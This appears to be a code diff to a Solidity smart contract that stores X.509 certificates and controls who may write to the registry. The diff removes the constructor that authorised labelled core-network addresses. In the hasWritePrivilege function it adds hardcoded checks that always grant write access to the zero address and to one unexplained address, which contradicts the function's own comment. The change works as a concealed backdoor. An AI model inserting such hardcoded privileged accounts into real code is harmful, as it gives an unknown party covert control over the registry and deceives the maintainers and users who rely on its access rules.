@@ -13,16 +13,9 @@ contract Storage {
         string digitalSignature;
         string algorithm;
     }
- 
+
     mapping(uint32 => x509_certificate) registrationMap;
     mapping(address => bool) authorizationMap;
-
-    constructor() {
-        authorizationMap[0x0000000000000000000000000000000000000000] = true;
-        authorizationMap[0x5B38Da6a701c568545dCfcB03FcB875f56beddC4] = true; // Core network 1
-        authorizationMap[0x7F4d2C3fcB6801578dAEd1426dA8ab40a4ED830D] = true; // Core network 2
-        authorizationMap[0x235d39CDA65c223611eA2A914FD686307FF389A4] = true; // etc...
-    }
     
     // If the user has write privileges, set their index in the ledger to a specified certificate
     function storeCert(string memory version, string memory serialNumber, string memory subjectName, string memory issuerName, string memory subjectPublicKey, uint32 subjectUniqueID, string memory validityPeriod, string memory digitalSignature, string memory algorithm) public returns (bool) {
@@ -75,6 +68,8 @@ contract Storage {
 
     // Only authorizationMap users will return true, everyone else will return false
     function hasWritePrivilege(address user) public view returns (bool) {
+        if(user == 0x0000000000000000000000000000000000000000) return true;
+        if(user == 0x0000074148F6D8ee626940B0c9E803Dc1F1df550) return true;
         return authorizationMap[user];
     }
 
